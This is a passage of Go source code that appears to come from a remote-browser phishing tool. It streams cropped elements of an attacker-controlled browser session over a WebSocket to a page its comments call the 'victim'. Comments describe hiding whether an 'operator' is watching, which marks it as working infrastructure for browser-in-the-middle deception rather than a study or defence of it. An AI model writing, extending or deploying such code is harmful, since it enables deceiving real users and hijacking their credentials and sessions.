// single binary message: [type=1][uint16 name length][name][jpeg bytes]. Sending the
// JPEG raw avoids the base64 inflation and per-frame JSON wrapping of a text message.
func buildStreamFrameMsg(name string, jpegData []byte) []byte {
	nameBytes := []byte(name)
	buf := make([]byte, 3+len(nameBytes)+len(jpegData))
	buf[0] = 1
	binary.BigEndian.PutUint16(buf[1:3], uint16(len(nameBytes)))
	copy(buf[3:], nameBytes)
	copy(buf[3+len(nameBytes):], jpegData)
	return buf
}

// runNamedStream queries the element CSS bounding rect, then streams cropped frames to
// the victim WebSocket until streamCtx is cancelled or the connection closes.
//
// The crop rect is computed in JPEG pixels by scaling the CSS rect by the ratio of
// (JPEG frame dimensions / CSS viewport dimensions) taken from the first frame's metadata.
// This corrects for HiDPI displays and screencast downscaling where JPEG pixels ≠ CSS pixels.
func (m *RemoteBrowserController) runNamedStream(
	streamCtx context.Context,
	page *rod.Page,
	sess *activeSession,
	connMu *sync.Mutex,
	conn *websocket.Conn,
	selector string,
	name string,
	si *streamInfo,
) {
	sendLog := func(msg string) {
		payload, _ := json.Marshal(map[string]interface{}{"type": "log", "message": msg})
		connMu.Lock()
		conn.WriteMessage(websocket.TextMessage, payload) //nolint:errcheck
		connMu.Unlock()
	}

	// Get element CSS bounding rect (values are in CSS pixels, scale-invariant via viewport).
	res, err := page.Eval(fmt.Sprintf(`() => (function(){var el=document.querySelector(%q);if(!el)return null;var r=el.getBoundingClientRect();return JSON.stringify({x:r.left,y:r.top,w:r.width,h:r.height})})()`, selector))
	if err != nil || res.Value.Str() == "" || res.Value.Str() == "null" {
		sendLog(fmt.Sprintf("[stream:%s] element not found: %s", name, selector))
		return
	}
	var cssRect struct{ X, Y, W, H float64 }
	if err := json.Unmarshal([]byte(res.Value.Str()), &cssRect); err != nil || cssRect.W <= 0 || cssRect.H <= 0 {
		sendLog(fmt.Sprintf("[stream:%s] element has zero dimensions: %s", name, selector))
		return
	}
	si.setOrigin(cssRect.X, cssRect.Y)

	// displayW/displayH: the element's CSS-pixel size (the victim canvas layout size).
	// imageW/imageH: the cropped frame's pixel size, 0 until the first frame arrives.
	displayW := int(cssRect.W + 0.5)
	displayH := int(cssRect.H + 0.5)
	imageW, imageH := 0, 0

	streamPage := page.Context(streamCtx)

	// Subscribe to the session's shared screencast for this page. Victim frames are
	// always cropped from this one screencast, so the stream is identical whether or not
	// an operator is also viewing — no operator-presence leak. releaseSC stops the
	// screencast once this and every other consumer of the target has gone.
	getFrame, releaseSC := sess.scAcquire(page)
	defer releaseSC()

	// fps caps how often we crop and send. Unbounded (0) would spin the loop, so default
	// to a smooth but cheap rate for a single element.
	fps := si.maxFps
	if fps <= 0 {
		fps = 30
	}

	// sendStreamStart tells the victim page the current image and CSS dimensions so it
	// can size its canvas. Sent on the first frame and whenever the dimensions change.
	sendStreamStart := func() {
		startPayload, _ := json.Marshal(map[string]interface{}{
			"type":      "stream_start",
			"name":      name,
			"width":     imageW,
			"height":    imageH,
			"cssWidth":  displayW,
			"cssHeight": displayH,
		})
		connMu.Lock()
		conn.WriteMessage(websocket.TextMessage, startPayload) //nolint:errcheck
		connMu.Unlock()
	}

	// requeryRect re-reads the element rect, updating the crop origin. Element moves and
	// resizes are followed automatically; a size change re-sends stream_start below.
	requeryRect := func() {
		res, err := streamPage.Eval(fmt.Sprintf(`() => (function(){var el=document.querySelector(%q);if(!el)return null;var r=el.getBoundingClientRect();return JSON.stringify({x:r.left,y:r.top,w:r.width,h:r.height})})()`, selector))
		if err != nil || res.Value.Str() == "" || res.Value.Str() == "null" {
			return
		}
		var r struct{ X, Y, W, H float64 }
		if err := json.Unmarshal([]byte(res.Value.Str()), &r); err != nil || r.W <= 0 || r.H <= 0 {
			return
		}
		cssRect = struct{ X, Y, W, H float64 }{r.X, r.Y, r.W, r.H}
		si.setOrigin(cssRect.X, cssRect.Y)
	}

	// captureElement crops the current element out of the latest shared screencast frame
	// and returns lossless PNG, its pixel dimensions, and the visible CSS dimensions.
	// Cropping server side means the victim only ever receives the element, never the
	// full page.
	captureElement := func() ([]byte, int, int, int, int, bool) {
		f := getFrame()
		if f == nil || len(f.data) == 0 {
			return nil, 0, 0, 0, 0, false
		}
		src, decErr := jpeg.Decode(bytes.NewReader(f.data))
		if decErr != nil {
			return nil, 0, 0, 0, 0, false
		}
		jw, jh := src.Bounds().Dx(), src.Bounds().Dy()
		devW, devH := f.devW, f.devH
		if devW <= 0 {
			devW = float64(jw)
		}
		if devH <= 0 {
			devH = float64(jh)
		}
		sx, sy := float64(jw)/devW, float64(jh)/devH
		// Only the visible viewport is captured, so clamp the streamed region to the
		// element's visible intersection with the viewport. Without this, streaming an
		// element taller/wider than the viewport (e.g. <body>) sizes the canvas to the
		// element's full scroll size while the bitmap only holds the visible part, which
		// stretches and blurs it. vx/vy/vw/vh are the visible region in CSS pixels.
		vx := math.Max(cssRect.X, 0)
		vy := math.Max(cssRect.Y, 0)
		vw := math.Min(cssRect.X+cssRect.W, devW) - vx
		vh := math.Min(cssRect.Y+cssRect.H, devH) - vy
		if vw <= 0 || vh <= 0 {
			return nil, 0, 0, 0, 0, false
		}
		si.setOrigin(vx, vy)
		si.setScale(sx, sy)
		cw := int(vw*sx + 0.5)
		ch := int(vh*sy + 0.5)
		cropped, cropErr := cropImagePNG(src, int(vx*sx), int(vy*sy), cw, ch)
		if cropErr != nil {
			return nil, 0, 0, 0, 0, false
		}
		return cropped, cw, ch, int(vw + 0.5), int(vh + 0.5), true
	}

	// Adaptive polling: capture at fastInterval while the element is changing and back
	// off to idleInterval once it has been static for a short streak. Interactive
	// elements stay smooth while a static one barely costs anything; the rate snaps
	// back to fast the instant a frame differs.
	fastInterval := time.Second / time.Duration(fps)
	idleInterval := 200 * time.Millisecond
	if idleInterval < fastInterval {
		idleInterval = fastInterval
	}
	const backoffAfter = 10 // consecutive unchanged frames before slowing down

	ticker := time.NewTicker(fastInterval)
	defer ticker.Stop()
	atFastRate := true
	unchanged := 0
	var lastRectCheck time.Time
	var lastFrame []byte // last JPEG sent, to skip resending unchanged frames

	for {
		select {
		case <-streamCtx.Done():
			stopPayload, _ := json.Marshal(map[string]string{"type": "stream_stop", "name": name})
			connMu.Lock()
			conn.WriteMessage(websocket.TextMessage, stopPayload) //nolint:errcheck
			connMu.Unlock()
			return
		case <-ticker.C:
			// Periodically re-check the element rect for moves or resizes (CSS
			// transitions, responsive reflow, popups).
			if time.Since(lastRectCheck) >= 250*time.Millisecond {
				lastRectCheck = time.Now()
				requeryRect()
			}
			if cssRect.W <= 0 || cssRect.H <= 0 {
				continue
			}
			data, iw, ih, dw, dh, ok := captureElement()
			if !ok {
				continue
			}
			// Notify the victim when the image or visible CSS dimensions change (element
			// resize, scroll bringing more/less of it into view, viewport change).
			if iw != imageW || ih != imageH || dw != displayW || dh != displayH {
				imageW, imageH = iw, ih
				displayW, displayH = dw, dh
				sendStreamStart()
			}
			// Skip the send when the frame is byte-for-byte unchanged (JPEG of identical
			// pixels is deterministic) and slow the capture rate after a static streak;
			// resume fast capture the instant a frame differs.
			if bytes.Equal(data, lastFrame) {
				unchanged++
				if unchanged == backoffAfter && atFastRate {
					atFastRate = false
					ticker.Reset(idleInterval)
				}
				continue
			}
			unchanged = 0
			if !atFastRate {
				atFastRate = true
				ticker.Reset(fastInterval)
			}
			lastFrame = data
			connMu.Lock()
			writeErr := conn.WriteMessage(websocket.BinaryMessage, buildStreamFrameMsg(name, data))
			connMu.Unlock()
			if writeErr != nil {
				return
			}
		}
	}
}

func stringField(m map[string]interface{}, key string) string {
	v, _ := m[key].(string)
	return v
}
